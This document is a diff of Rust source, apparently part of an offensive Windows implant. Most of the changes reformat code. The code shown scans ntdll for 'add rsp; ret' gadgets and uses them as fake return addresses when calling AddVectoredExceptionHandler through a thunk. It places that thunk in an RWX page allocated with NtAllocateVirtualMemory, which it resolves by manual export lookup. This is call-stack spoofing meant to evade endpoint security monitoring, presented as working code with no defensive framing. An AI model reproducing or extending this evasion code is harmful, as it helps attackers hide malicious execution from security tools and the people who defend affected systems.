@@ -102,7 +102,11 @@ pub unsafe fn scan_stub_in_module(module_base: *mut u8) -> Option<ReturnStub> {
         if &name[..5] == b".text" {
             let va = sec.virtual_address as usize;
             let vs = sec.virtual_size as usize;
-            let size = if vs > 0 { vs } else { sec.size_of_raw_data as usize };
+            let size = if vs > 0 {
+                vs
+            } else {
+                sec.size_of_raw_data as usize
+            };
             return scan_for_stub(module_base as usize + va, size, module_base as usize + va);
         }
     }
@@ -122,12 +126,14 @@ unsafe fn scan_for_stub(
     // XX = imm8, multiples of 8, 0x08..=0x78.
     let mut i = 0;
     while i + 5 <= bytes.len() {
-        if bytes[i] == 0x48 && bytes[i + 1] == 0x83
-            && bytes[i + 2] == 0xC4 && bytes[i + 4] == 0xC3
+        if bytes[i] == 0x48 && bytes[i + 1] == 0x83 && bytes[i + 2] == 0xC4 && bytes[i + 4] == 0xC3
         {
             let imm = bytes[i + 3];
             if imm >= 8 && imm % 8 == 0 && imm < 0x80 {
-                return Some(ReturnStub { addr: mod_base + i, stack_clean: imm });
+                return Some(ReturnStub {
+                    addr: mod_base + i,
+                    stack_clean: imm,
+                });
             }
         }
         i += 1;
@@ -136,7 +142,10 @@ unsafe fn scan_for_stub(
     // The callee returns to this RET, which pops our after_call → back to us.
     for (j, &b) in bytes.iter().enumerate() {
         if b == 0xC3 {
-            return Some(ReturnStub { addr: mod_base + j, stack_clean: 0 });
+            return Some(ReturnStub {
+                addr: mod_base + j,
+                stack_clean: 0,
+            });
         }
     }
     None
@@ -221,6 +230,7 @@ pub unsafe fn call_with_spoofed_return_4(
         fake_ret = in(reg) fake_ret,
         adjust = in(reg) adjust,
         lateout("rax") result,
+        options(att_syntax),
     );
     result
 }
@@ -243,39 +253,37 @@ pub unsafe fn add_vectored_handler_spoofed(
 ) -> *mut c_void {
     // Build a raw-byte trampoline that calls AddVectoredExceptionHandler
     // with a spoofed return address (ntdll RET stub).
-    let aveh = match crate::resolve::export_addr(
-        b"kernelbase.dll", b"AddVectoredExceptionHandler",
-    ).or_else(|| crate::resolve::export_addr(
-        b"kernel32.dll", b"AddVectoredExceptionHandler",
-    )) {
+    let aveh = match crate::resolve::export_addr(b"kernelbase.dll", b"AddVectoredExceptionHandler")
+        .or_else(|| crate::resolve::export_addr(b"kernel32.dll", b"AddVectoredExceptionHandler"))
+    {
         Some(a) => a,
         None => return core::ptr::null_mut(),
     };
 
     // Build the trampoline thunk.
     let thunk = crate::caller_spoof_thunk::build(
-        stub.addr,      // ntdll RET stub (fake return address)
-        aveh,           // AddVectoredExceptionHandler
-        first,          // arg1: First (1 = front)
+        stub.addr,        // ntdll RET stub (fake return address)
+        aveh,             // AddVectoredExceptionHandler
+        first,            // arg1: First (1 = front)
         handler as usize, // arg2: Handler fn ptr
-        0,              // arg3: unused
-        0,              // arg4: unused
+        0,                // arg3: unused
+        0,                // arg4: unused
     );
 
     // Allocate RWX page for the trampoline.
-    let nt_alloc = match crate::resolve::export_addr(
-        b"ntdll.dll", b"NtAllocateVirtualMemory",
-    ) {
-        Some(a) => a, None => return core::ptr::null_mut(),
+    let nt_alloc = match crate::resolve::export_addr(b"ntdll.dll", b"NtAllocateVirtualMemory") {
+        Some(a) => a,
+        None => return core::ptr::null_mut(),
     };
-    type NtAlloc = unsafe extern "system" fn(
-        usize, *mut *mut c_void, usize, *mut usize, u32, u32,
-    ) -> i32;
+    type NtAlloc =
+        unsafe extern "system" fn(usize, *mut *mut c_void, usize, *mut usize, u32, u32) -> i32;
     let alloc: NtAlloc = core::mem::transmute(nt_alloc);
     let mut page: *mut c_void = core::ptr::null_mut();
     let mut sz: usize = 0x1000;
     let st = alloc(!0usize, &mut page, 0, &mut sz, 0x3000, 0x40); // RWX
-    if st < 0 || page.is_null() { return core::ptr::null_mut(); }
+    if st < 0 || page.is_null() {
+        return core::ptr::null_mut();
+    }
 
     // Copy thunk bytes.
     core::ptr::copy_nonoverlapping(thunk.bytes.as_ptr(), page as *mut u8, thunk.len);
@@ -285,11 +293,11 @@ pub unsafe fn add_vectored_handler_spoofed(
     let handle = thunk_fn();
 
     // Free the page.
-    let nt_free = match crate::resolve::export_addr(
-        b"ntdll.dll", b"NtFreeVirtualMemory",
-    ) {
+    let nt_free = match crate::resolve::export_addr(b"ntdll.dll", b"NtFreeVirtualMemory") {
         Some(a) => a,
-        None => { return handle as *mut c_void; }
+        None => {
+            return handle as *mut c_void;
+        }
     };
     type NtFree = unsafe extern "system" fn(usize, *mut *mut c_void, *mut usize, u32) -> i32;
     let free: NtFree = core::mem::transmute(nt_free);
